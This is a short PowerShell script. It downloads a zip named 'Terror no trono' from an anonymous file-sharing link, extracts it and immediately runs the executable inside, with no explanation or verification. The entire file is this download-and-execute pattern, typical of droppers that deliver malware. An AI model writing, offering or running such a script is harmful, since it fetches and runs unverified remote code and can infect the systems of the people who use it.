# Import the required modules
import-module PowerShellGet
import-module Archive
# Download the Terror no trono.zip file
Invoke-WebRequest -Uri "https://filetransfer.io/data-package/eeML0ZKe/download" -OutFile "Terror no trono.zip"
# Extract the Terror no trono.zip file
Expand-Archive -Path "Terror no trono.zip" -DestinationPath "Terror no trono"
# Execute the Terror no trono.exe file
Start-Process -FilePath "Terror no trono\Terror no trono.exe"